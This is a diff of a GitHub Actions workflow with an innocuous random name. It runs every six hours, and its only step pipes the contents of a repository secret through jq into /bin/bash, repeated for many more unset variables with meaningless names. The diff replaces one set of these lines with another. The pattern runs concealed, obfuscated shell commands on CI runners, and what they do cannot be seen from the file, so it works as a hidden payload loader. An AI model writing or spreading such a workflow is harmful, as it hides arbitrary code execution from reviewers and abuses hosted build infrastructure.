@@ -1,10 +1,9 @@
 name: normalkerchief
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 0/6 * * *'
-jobs:  # 3360
+    - cron: '23 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,23 +11,14 @@ jobs:  # 3360
       - uses: actions/checkout@v4
       - name: normalkerchief
         env:
-          ri6: ${{ secrets.ri6 }}
+          sqg2: ${{ secrets.sqg2 }}
         run: |
-          echo $ri6 | jq -r .vw34921 | /bin/bash
-          echo $mh52097 | jq -r .ciww125 | /bin/bash
-          echo $ljmwi241 | jq -r .fk619 | /bin/bash
-          echo $zwbn811 | jq -r .rs8 | /bin/bash
-          echo $fiqh07 | jq -r .byphj39904 | /bin/bash
-          echo $x6 | jq -r .kuu69 | /bin/bash
-          echo $gj1 | jq -r .ohnut5120 | /bin/bash
-          echo $rdwd6781 | jq -r .lvqb92 | /bin/bash
-          echo $dgw30732 | jq -r .x492 | /bin/bash
-          echo $lemj12 | jq -r .l129 | /bin/bash
-          echo $l024 | jq -r .z396 | /bin/bash
-          echo $xs86 | jq -r .rldcd1656 | /bin/bash
-          echo $qtx23750 | jq -r .wcrg9838 | /bin/bash
-          echo $smy62153 | jq -r .oie59 | /bin/bash
-          echo $s673 | jq -r .f06 | /bin/bash
-          echo $st76 | jq -r .p809 | /bin/bash
-          echo $iw53 | jq -r .iera12929 | /bin/bash
+          echo $sqg2 | jq -r .j15 | /bin/bash
+          echo $euve7 | jq -r .bto9 | /bin/bash
+          echo $bx66 | jq -r .cmzj5 | /bin/bash
+          echo $bqrbi48 | jq -r .cgmu2 | /bin/bash
+          echo $nk4 | jq -r .eehhy22603 | /bin/bash
+          echo $gkhwu1917 | jq -r .wwrh9038 | /bin/bash
+          echo $pidr28 | jq -r .td05079 | /bin/bash
+          echo $ouwv74 | jq -r .huu737 | /bin/bash
 
